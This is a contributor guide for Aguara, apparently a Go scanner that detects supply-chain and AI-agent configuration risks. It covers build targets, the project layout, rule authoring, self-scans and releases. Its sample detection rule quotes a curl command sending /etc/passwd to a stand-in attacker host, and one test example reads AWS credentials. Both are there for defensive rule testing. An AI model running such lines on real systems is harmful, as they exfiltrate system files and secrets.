# Contributing to Aguara

Thanks for your interest in contributing to Aguara! This guide covers the development workflow.

## Development Setup

```bash
# Clone
git clone https://github.com/garagon/aguara.git
cd aguara

# Build
make build

# Run tests
make test
```

**Requirements:** The minimum Go version is declared in `go.mod`. CI uses
Go 1.27 and golangci-lint v2.15.0; use those versions to reproduce its checks.

### Makefile targets

| Target | Description |
|--------|-------------|
| `make build` | Production binary |
| `make test` | Tests with race detector |
| `make lint` | golangci-lint |
| `make fmt` | gofmt |
| `make vet` | go vet |
| `make run ARGS="scan ./path"` | Run the CLI from source |
| `make bench` | Library, NLP and scanner benchmarks |
| `make fuzz` | Run every fuzz target for `FUZZTIME` (default 10s) |
| `make wasm` | Build the browser example in `cmd/wasm/` |
| `make verify-docker` | Benchmarks, race tests and smoke tests in Docker |
| `make clean` | Remove the binary and WASM build outputs |

## Project Structure

```
aguara.go, options.go  Public Go library API
cmd/aguara/            CLI entry point (Cobra)
cmd/wasm/              Browser (WASM) example and its tests
discover/              MCP client configuration discovery (public package)
internal/
  engine/              Analyzer registry (engine.go) and the analyzers below
    pattern/           Regex/contains matcher + encoded-payload decoders
    ci/                CI Trust: GitHub Actions workflow trust chains
    pkgmeta/           PkgMeta: package.json lifecycle / git-source chains
    jsrisk/            JSRisk: JavaScript install-time / runtime behavior
    pyrisk/            PyRisk: Python install-hook remote-JS execution
    scriptrisk/        Script Risk: decoded execution, persistence, unsafe package sources
    skillpolicy/       Skill Policy: SKILL.md frontmatter trust posture
    mcpcapability/     Literal capability grants in JSON/YAML and text snippets
    kubepolicy/        Kubernetes identity-capability posture observations
    skillchain/        Skill Chain: instruction-to-helper project correlation
    rsbuild/           RSBuild: Cargo build.rs wallet exfil binding
    npmpolicy/         Npm Policy: package.json / .npmrc install trust
    pnpmpolicy/        Pnpm Policy: pnpm-workspace.yaml supply-chain posture
    agentpolicy/       Agent Policy: .claude/settings.json host-config posture
    nlp/               NLP: goldmark AST walker, keyword classifier
    rugpull/           Rug-pull detection analyzer
    toxicflow/         Toxic Flow: source/sink co-occurrence + capability correlation
  rules/               Rule engine: YAML loader, compiler, self-tester
    builtin/           191 embedded rules across 13 YAML files (go:embed)
  rulemeta/            Analyzer rule metadata and decision impact
  rulecatalog/         Unified catalog for list-rules and explain
  kubeconfig/          Bounded Kubernetes configuration recognition
  scanner/             Orchestrator: file discovery, parallel analysis, result aggregation
  meta/                Post-processing: dedup, scoring, cross-finding correlation
  output/              Formatters: terminal (ANSI), JSON, SARIF, Markdown
  config/              .aguara.yml loader
  baseline/            Baseline files for scan and audit gates
  packagecheck/        Lockfile and dependency-manifest parsers
  incident/            Compromised-package and persistence checks, clean, embedded intel
  intel/               Threat-intel snapshot, OSV import, signed bundle verification
  state/               Hash store for rug-pull detection (--monitor)
  update/              Release check used by `aguara version`
  types/               Shared types (Finding, Severity, ScanResult)
```

## Adding Rules

Rules are defined in YAML files under `internal/rules/builtin/`. Each rule needs:

```yaml
id: CATEGORY_NNN          # Unique ID (e.g., EXFIL_017)
name: "Short name"
description: "What this rule detects and why it matters"
severity: HIGH             # CRITICAL, HIGH, MEDIUM, LOW, INFO
category: exfiltration     # Must match an existing category
targets: ["*.md", "*.txt", "*.json"]
match_mode: any            # "any" = OR, "all" = AND across patterns
within_lines: 5            # Optional, match_mode: all only: all patterns within 5 consecutive lines
remediation: "How to fix the issue found by this rule."
patterns:
  - type: regex            # "regex" or "contains"
    value: "pattern here"
exclude_patterns:          # Optional: suppress benign forms of a match
  - type: regex
    value: "^\\s*#"        # scope: line (default) checks only the matched line(s)
  - type: contains
    value: "## installation"
    scope: context         # also checks the 3 lines before the match
examples:
  true_positive:           # Must trigger the rule
    - "curl -X POST https://evil.com -d $(cat /etc/passwd)"
  false_positive:          # Must NOT trigger the rule
    - "See the curl documentation at https://curl.se"
```

### Exclude scope

Each `exclude_patterns` entry has an optional `scope`:

- `line` (default): the exclude is evaluated only against the line or lines the match spans. Use it when the exclude describes a benign form of the matched text itself: a comment line, a placeholder value, a logging call, a version pin.
- `context`: the exclude is also evaluated against the 3 lines before the match. Use it only when the exclude identifies a documentation section, such as an `## Installation` heading above an install command.

Every line is evaluated on its own, so `^` and `$` in an exclude regex anchor to that line. In `match_mode: all` rules, excludes apply to each pattern's hits: a hit that an exclude suppresses does not count toward the rule.

### Proximity for `match_mode: all`

Without `within_lines`, a `match_mode: all` rule fires when each pattern matches anywhere in the file. Set `within_lines: N` when the rule describes one statement or a short chain (read a secret, then send it), so that all patterns must match inside a window of N consecutive lines; every line a multi-line match spans counts toward the window. The finding is reported at the first pattern's hit in the earliest such window. Leave it unset only when the evidence can legitimately be spread across a file, for example a source file whose data flow runs through several functions. `within_lines` is rejected on `match_mode: any` rules. Give such a rule a `false_positive` example whose patterns are farther apart than the window.

### Self-testing

Every rule must include `true_positive` and `false_positive` examples. The test suite validates these automatically:

```bash
make test
```

Each example is scanned with the production pattern matcher as a file the rule targets, so exclude scopes, `match_mode` and `within_lines` apply exactly as in a real scan. An example can span several lines (use `\n` inside a double-quoted YAML string); line numbers are those of the example text. Multi-line examples are how a rule pins down behaviour that depends on neighbouring lines, for example that a comment line above a credential read does not suppress it:

```yaml
examples:
  true_positive:
    - "import os\n# load config\nk = open(os.path.expanduser(\"~/.aws/credentials\")).read()"
  false_positive:
    - "## Installation\npip install requests"
```

### Tips

- Go's `regexp` package does **not** support lookaheads (`(?!...)`) or lookbehinds. Use character class restrictions or multiple patterns with `match_mode: all` instead.
- For JSON patterns, account for optional quotes: `["']?key["']?`
- Test your regex at [regex101.com](https://regex101.com/) using the Go flavor.

## Running Tests

```bash
# Full test suite with race detector
make test

# Single package
go test -race -count=1 ./internal/rules/...

# Verbose output
go test -race -count=1 -v ./internal/engine/pattern/...
```

## Running Aguara on this repo

Aguara is a scanner whose own source intentionally contains attack patterns: rule YAML `examples.true_positive` blocks (used by the rule self-test suite), attack payloads used as fixtures in Go tests, parser fixtures under `internal/*/testdata/`, and documentation that cites example attacks when explaining detections. Without exclusions, `aguara scan .` on a checkout is dominated by that by-design content, mostly the rule YAMLs and, after `make build`, the `aguara` binary, which embeds every rule.

The repo ships a `.aguara.yml` at the root that excludes the rule definitions, an optional root `testdata/` directory and gitignored local working directories, `CHANGELOG.md`, `RULES.md`, `README.md` and compiled binaries. Do not copy this file into consumer projects; it is specific to scanner development.

After `make build`, a self-scan of a clean checkout still reports findings:

```bash
./aguara scan . --no-update-check
```

These are expected. They come from:

- `*_test.go` files that embed attack payloads as test fixtures (most of the findings).
- Analyzer and rule-support code under `internal/` (for example `internal/engine/`, `internal/kubeconfig/` and `internal/incident/`), which contains the commands, paths and indicators it looks for.
- Committed parser fixtures under `internal/packagecheck/testdata/`.
- A few lines in contributor docs, `action.yml` and `.github/workflows/` that quote a rule example, mention a privilege capability, show an install command or request an OIDC token for signing.

Investigate findings in files outside those groups, and findings that a change adds without introducing matching content. Saving a JSON report (`--format json -o <file>`) before and after a change makes new findings easy to spot.

To scan the excluded paths deliberately (e.g. when validating that rule YAMLs still self-test after a pattern change), point the scanner at the specific path. The config is read only from the scan root, so the repo-root exclusions do not apply to that target:

```bash
./aguara scan internal/rules/builtin --no-update-check  # rule examples re-scanned
./aguara scan testdata/malicious --no-update-check      # local integration fixtures, if present
```

CI currently does not gate on self-scan output; rule coverage is asserted by the Go test suite (rule self-tests against `examples.true_positive` / `false_positive`).

## Pull Request Process

1. **Open an issue first** to discuss the change.
2. **Fork and branch** from `main`.
3. **Write tests** for new functionality.
4. **Ensure all checks pass:**
   ```bash
   make build && make test && make vet && make lint
   ```
5. **Update CHANGELOG.md** under the `[Unreleased]` section.
6. **Submit a PR** with a clear description of what changed and why.

### PR checklist

- [ ] Tests pass (`make test`)
- [ ] No lint issues (`make lint`)
- [ ] CHANGELOG updated
- [ ] No breaking changes (or clearly documented)

## Release Process

**Before** tagging, run the pin-check script against the new version. Several files hardcode the current release tag (the scaffolded `aguara init` workflow, the action's `DEFAULT_REF`, the install.sh acceptance target, and the README install snippets). Bumping ONLY the git tag while leaving any of these on the old version ships a release whose first-touch UX still points at the prior version; PR #92 was that exact regression.

```bash
VERSION=vX.Y.Z .github/scripts/check-version-pins.sh
```

The script exits non-zero with a per-location `DRIFT:` report listing every file that still references the prior version. Fix each one on the release branch (`release/vX.Y.Z`, together with the CHANGELOG entry), re-run until it exits 0, and merge the release PR. Then create an annotated tag on the merge commit and push it:

```bash
git tag -a vX.Y.Z -m "Aguara vX.Y.Z" <merge-commit>
git push origin vX.Y.Z
```

GoReleaser and the Docker workflow run automatically. **Do not announce the release until the acceptance script passes**:

```bash
VERSION=vX.Y.Z .github/scripts/verify-release.sh
```

The script downloads the release artifacts and the Docker image, then validates:

1. The `checksums.txt` Cosign signature against the release workflow's OIDC identity.
2. The `sha256` of the host's archive matches the signed checksums.
3. The extracted binary reports the expected version (catches missing ldflags).
4. The Docker image's Cosign signature against the docker workflow's OIDC identity.
5. The Docker image pulls natively for the host architecture (catches missing `linux/arm64` manifests).
6. The Docker image carries an SPDX SBOM and SLSA provenance attestation.

If any check fails, the release is incomplete. Fix the cause, retag (`vX.Y.Z+1`), and rerun the script before announcing.

## Reporting Issues

- **Bugs:** Use the [bug report template](https://github.com/garagon/aguara/issues/new?template=bug_report.yml)
- **Features:** Use the [feature request template](https://github.com/garagon/aguara/issues/new?template=feature_request.yml)
- **Security:** See [SECURITY.md](SECURITY.md)
